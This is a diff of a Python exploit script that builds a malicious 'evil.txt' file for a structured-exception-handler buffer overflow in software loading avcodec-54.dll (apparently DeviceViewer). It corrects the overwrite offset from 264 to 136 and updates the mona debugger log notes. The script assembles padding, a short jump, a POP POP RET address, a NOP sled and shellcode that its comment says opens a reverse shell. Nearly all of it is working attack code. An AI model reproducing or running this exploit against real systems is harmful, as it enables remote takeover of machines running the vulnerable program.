@@ -16,7 +16,7 @@ from struct import *
 #----------------------------------------#
 # Bad characters: "\x00\x0a\x0d"         #  
 # POP POP RET: 0x6A0E6A86                #
-# SEH handler offset: 264                #
+# SEH handler offset: 136                #
 #----------------------------------------#
 
 malicious_file = "evil.txt"
@@ -63,20 +63,20 @@ shellcode = (
 seh = pack('I', 0x6A0E6A86) # POP POP RET from - avcodec-54.dll
 nseh = '\xeb\x06\x90\x90' # short jump 6 over island
 
-payload  = "A" * 264 # fill up the buffer space with calculated offset - !mona findmsp
+payload  = "A" * 136 # fill up the buffer space with calculated offset - !mona findmsp
 payload += nseh # a short jump \xEB\X06 to jump over 6 placed 
 payload += seh # POP POP RET from an associated DLL without any protections - !mona seh -n
 payload += "\x90" * 16 # small NOPSLED to catch the short jump
 payload += shellcode # pops a reverse shell back to the host system
-payload += "C" *(4000 - len(payload))
+payload += "C" *(1000 - len(payload))
 
 # Log data, item 13
 # Address=6A11548E
 # Message=  0x6a11548e : pop esi # pop edi # ret  |  {PAGE_EXECUTE_READ} [avcodec-54.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files (x86)\DeviceViewer\avcodec-54.dll)
 
-# Log data, item 44
+# Log data, item 43
 # Address=0BADF00D
-# Message=    SEH record (nseh field) at 0x0041f12c overwritten with normal pattern : 0x41386941 (offset 264), followed by 9728 bytes of cyclic data after the handler
+# Message=    SEH record (nseh field) at 0x0035ef24 overwritten with normal pattern : 0x65413565 (offset 136), followed by 9856 bytes of cyclic data after the handler
 
 
 try:
